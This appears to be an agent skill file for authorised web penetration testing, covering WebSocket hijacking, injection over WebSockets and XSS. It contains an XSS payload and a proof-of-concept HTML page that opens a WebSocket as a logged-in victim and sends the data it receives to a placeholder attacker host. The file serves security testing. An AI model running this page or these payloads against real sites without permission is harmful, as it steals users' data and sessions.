---
name: websockets
description: >-
  Tests WebSocket-based features for cross-site WebSocket hijacking (CSWSH),
  missing handshake Origin/CSRF validation, and input-based injection that
  reaches the backend over WS. Use when you see ws:// or wss:// connections, a
  WebSocket handshake (HTTP 101 Upgrade, Sec-WebSocket-Key), chat / live feed /
  notifications / real-time / streaming features, cookie-only handshake auth
  with no CSRF token, missing Origin checks on the handshake, or user-supplied
  message content reaching a server-side sink (SQLi/XSS/XXE over WebSockets) or
  rendered in other users' browsers (reflected/stored XSS via WS).
---

# WebSocket security

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


## When to test (any WebSocket-using feature)
- Any `ws://` / `wss://` connection: chat, live comments, notifications, dashboards, presence, collaborative editing, price/score feeds, multiplayer.
- The HTTP handshake: `GET ... Upgrade: websocket`, `Sec-WebSocket-Key`, response `101 Switching Protocols`.
- Any place a message value is stored, broadcast to other users, or fed into a backend query/parser.

## Impact & priority (be honest)
- **High signal:** CSWSH where the handshake is authenticated by cookies alone and lets an attacker page exfiltrate the victim's data or perform privileged actions = account-data exfil / account takeover-adjacent.
- **High signal:** input over WS reaching a backend sink (SQLi, XXE, command/blind injection) confirmed with OAST or data extraction.
- **Context-dependent:** XSS via WS messages — high if stored and broadcast to other authenticated users; lower if only reflected to self with no cross-user reach.
- **Low / noise:** WS endpoint carrying no sensitive data, or one that properly validates Origin + uses a CSRF/handshake token.

## Detection (Burp)
- Intercept and review messages in the **WebSockets history** tab; replay/edit via **Repeater**; mint new messages in either direction.
- Inspect the handshake (Repeater pencil icon → edit handshake): is auth **cookie-only**? Is there a `CSRF`/unpredictable token in the handshake? Is the `Origin` header **validated** (try a forged/foreign Origin and a removed Origin)?
- Map every client-controlled message field to where it lands: backend query, file/XML parser, or other users' DOM.

## Exploitation
- **Message injection → classic sinks:** tamper message fields with SQLi / XXE / XSS / OS-command payloads and observe responses or side effects.
- **Blind injection:** when no response differs, use **OAST/out-of-band** (Burp Collaborator) payloads to confirm server-side execution.
- **Client-side XSS:** if server-to-client messages render unsanitized in the DOM (e.g. `{"message":"<img src=1 onerror=alert(1)>"}` broadcast to other users), prove XSS in a victim's session.
- **Cross-site WebSocket hijacking (CSWSH):** when the handshake relies **only on cookies** with **no CSRF token and no Origin check**, an attacker-origin page opens a WS to the target; the browser attaches the victim's cookies, giving the attacker two-way authenticated interaction — read sensitive data and send privileged messages. See Minimal PoC.

## Common issues
See `reference.md` for handshake mechanics, full intercept/replay workflow, per-class injection notes, blind/OAST technique, and CSWSH conditions, exploit, and fixes.

## Minimal PoC (CSWSH → for ./_EXPLOIT/)
Safe, read-only proof: an attacker-origin HTML page opens a WS as the logged-in victim and exfiltrates the responses it receives back to a server you control. Replace the target/exfil URLs; do not send state-changing messages.

```html
<!doctype html>
<!-- CSWSH PoC — host on attacker origin, open while victim is logged in -->
<script>
  const ws = new WebSocket('wss://TARGET/chat');   // target WS endpoint
  ws.onopen    = () => ws.send('READY');            // benign read trigger only
  ws.onmessage = (e) => {
    // exfil received (victim-authorized) data to your Collaborator/listener
    fetch('https://ATTACKER/c?d=' + encodeURIComponent(e.data),
          { mode: 'no-cors' });
  };
</script>
```
Capture the exfiltrated victim data as proof, then log the finding to `./_EXPLOIT/`.

## Don't report as noise
- WS endpoints with no sensitive/user data and no injectable backend reach.
- Handshakes that validate `Origin` and/or require a CSRF/unpredictable token (CSWSH not exploitable).
- "Reflected to self only" XSS with no path to another user.

## Deep reference
See `reference.md` and https://portswigger.net/web-security/websockets
